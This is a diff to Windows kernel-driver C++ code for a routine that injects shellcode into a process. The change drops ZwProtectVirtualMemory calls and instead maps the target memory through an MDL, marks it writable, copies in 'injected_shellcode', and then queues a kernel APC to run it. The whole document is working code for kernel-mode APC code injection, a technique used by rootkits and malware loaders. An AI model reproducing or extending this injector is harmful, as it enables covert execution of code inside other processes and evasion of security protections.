@@ -34,57 +34,68 @@ void apc_routines::normal_inject_code(PVOID, PVOID, PVOID)
 		return;
 	}
 
-	void* protection_address = address;
-	ULONG protection_size = static_cast<ULONG>(shellcode_size);
-	ULONG old_protection;
-
-	status = ::ZwProtectVirtualMemory(
-		NtCurrentProcess(),
-		&protection_address,
-		&protection_size,
-		PAGE_READWRITE,
-		&old_protection
+	auto mdl = ::IoAllocateMdl(
+		address,
+		sizeof(injected_shellcode),
+		false,
+		false,
+		nullptr
 	);
 
-	if (!NT_SUCCESS(status)) {
-		::ZwFreeVirtualMemory(
-			NtCurrentProcess(),
-			&address,
-			&shellcode_size,
-			MEM_FREE | MEM_RELEASE
-		);
-
+	if (!mdl) {
 		::ExReleaseRundownProtection(&g_rundown_protection);
 
-		KdPrint(("[-] Could not protect virtual memory: 0x%p.\n", status));
+		KdPrint(("[-] Could not allocate a MDL.\n", status));
 
 		return;
 	}
 
-	::memcpy_s(address, sizeof(injected_shellcode), injected_shellcode, sizeof(injected_shellcode));
-
-	status = ::ZwProtectVirtualMemory(
-		NtCurrentProcess(),
-		&protection_address,
-		&protection_size,
-		PAGE_EXECUTE_READ,
-		&old_protection
+	::MmProbeAndLockPages(
+		mdl,
+		KernelMode,
+		IoReadAccess
 	);
 
-	if (!NT_SUCCESS(status)) {
-		::ZwFreeVirtualMemory(
-			NtCurrentProcess(),
-			&address,
-			&shellcode_size,
-			MEM_FREE | MEM_RELEASE
-		);
+	auto mapped_address = ::MmMapLockedPagesSpecifyCache(
+		mdl,
+		KernelMode,
+		MmNonCached,
+		nullptr,
+		false,
+		NormalPagePriority
+	);
 
+	if (!mapped_address) {
+		::MmUnlockPages(mdl);
+		::IoFreeMdl(mdl);
 		::ExReleaseRundownProtection(&g_rundown_protection);
 
-		KdPrint(("[-] Could not protect virtual memory: 0x%p.\n", status));
+		KdPrint(("[-] Could not get a system address for the MDL.\n", status));
 
 		return;
 	}
+
+	status = ::MmProtectMdlSystemAddress(
+		mdl,
+		PAGE_READWRITE
+	);
+
+	if (!NT_SUCCESS(status)) {
+		::MmUnmapLockedPages(mapped_address, mdl);
+		::MmUnlockPages(mdl);
+		::IoFreeMdl(mdl);
+		::ExReleaseRundownProtection(&g_rundown_protection);
+
+		KdPrint(("[-] Could not protect MDL address: 0x%p.\n", status));
+
+		return;
+	}
+
+	::memcpy_s(mapped_address, sizeof(injected_shellcode), injected_shellcode, sizeof(injected_shellcode));
+
+	::MmUnmapLockedPages(mapped_address, mdl);
+	::MmUnlockPages(mdl);
+	::IoFreeMdl(mdl);
 
 	PKAPC apc = new (NonPagedPool, config::kDriverTag) KAPC;
 
